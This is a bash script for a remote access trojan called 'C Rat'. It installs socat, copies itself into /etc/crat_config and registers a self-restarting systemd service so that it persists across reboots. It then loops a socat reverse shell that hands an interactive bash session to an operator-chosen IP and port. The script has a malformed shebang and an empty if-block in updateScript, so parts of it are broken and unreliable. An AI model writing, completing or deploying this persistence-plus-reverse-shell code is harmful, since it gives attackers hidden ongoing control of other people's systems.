#/bin/bash

if [ ! -x "$(command -v socat)" ]; then sudo apt install -y socat; fi

# check if the file is already in /etc/crat_config/persistant/
function makePersistant {
  # check if the directory /etc/crat_config exists and create it if it doesn't
  if [ ! -d "/etc/crat_config" ]; then
    mkdir /etc/crat_config
  fi

  if [ ! -f /etc/crat_config/crat.sh ]; then
      cp crat.sh /etc/crat_config/crat.sh
  fi
}

function updateScript {
  # check if the directory /etc/crat_config exists and create it if it doesn't
  if [ ! -d "/etc/crat_config" ]; then
    mkdir /etc/crat_config
  fi

  if [ ! -f /etc/crat_config/crat.sh ]; then
      
  fi
}

# check if crat_daemon.service is already in /etc/systemd/system/
function registerDaemon {
  if [ ! -f /etc/systemd/system/crat_daemon.service ]; then
      echo "[Unit]
        Description=C Rat service
        After=network.target

        [Service]
        ExecStart=/bin/bash /etc/crat_config/crat.sh
        Restart=always
        RestartSec=4

        [Install]
        WantedBy=multi-user.target" >> /etc/systemd/system/crat_daemon.service

      sudo systemctl start crat_daemon.service
      sudo systemctl enable crat_daemon.service
  else 
    # if crat_daemon.service is already in /etc/systemd/system/ remove the old one and add the new one
    sudo systemctl stop crat_daemon.service
    sudo systemctl disable crat_daemon.service
    sudo rm /etc/systemd/system/crat_daemon.service
    echo "[Unit]
        Description=C Rat service
        After=network.target

        [Service]
        ExecStart=/bin/bash /etc/crat_config/crat.sh
        Restart=always
        RestartSec=4

        [Install]
        WantedBy=multi-user.target" >> /etc/systemd/system/crat_daemon.service

    sudo systemctl start crat_daemon.service
    sudo systemctl enable crat_daemon.service
  fi
}

function startReverseShell {
  while true
  do

    # check if the file /etc/crat/crat.ccw exist
    if [ -f /etc/crat/crat.ccw ]; then
      ip=$(cat /etc/crat/crat.ccw | cut -d ":" -f 1)
      port=$(cat /etc/crat/crat.ccw | cut -d ":" -f 2)
    else
      if [ -z "$1" ]; then
        echo "Please enter the IP address of the server you want to connect to"
        read -p "IP: " ip
      else
        ip=$1
      fi

      if [ -z "$2" ]; then
        echo "Please enter the port of the server you want to connect to"
        read -p "Port: " port
      else
        port=$2
      fi
    fi

    socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:$ip:$port
  done
}

